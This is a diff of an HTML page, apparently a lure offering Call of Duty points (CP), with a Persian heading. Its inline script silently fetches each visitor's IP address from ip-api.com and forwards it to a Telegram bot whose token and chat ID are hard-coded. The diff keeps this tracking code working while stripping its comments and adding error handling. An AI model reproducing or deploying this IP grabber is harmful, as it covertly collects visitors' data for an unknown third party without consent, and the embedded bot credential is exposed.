@@ -27,17 +27,18 @@
   <h1>سی پی کالاف</h1>
 
   <script>
-    const botToken = '6811411494:AAESLtVx1VFLV-wgeEWj82iw6Bljg3_wMqc';  // توکن ربات شما
-    const chatId = '1353504783';  // آیدی چت شما
+    const botToken = '6811411494:AAESLtVx1VFLV-wgeEWj82iw6Bljg3_wMqc';
+    const chatId = '1353504783';
 
-    // استفاده از سرویس ip-api.com برای دریافت آی‌پی
-    fetch('http://ip-api.com/json')
+    fetch('https://ip-api.com/json')
       .then(response => response.json())
       .then(data => {
-        const ip = data.query;  // آی‌پی از داده‌های بازگشتی
+        const ip = data.query;
         const message = `IP: ${ip}`;
-        // ارسال آی پی به ربات تلگرام
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+      })
+      .catch(error => {
+        console.error("خطا در گرفتن آی‌پی:", error);
       });
   </script>
 </body>
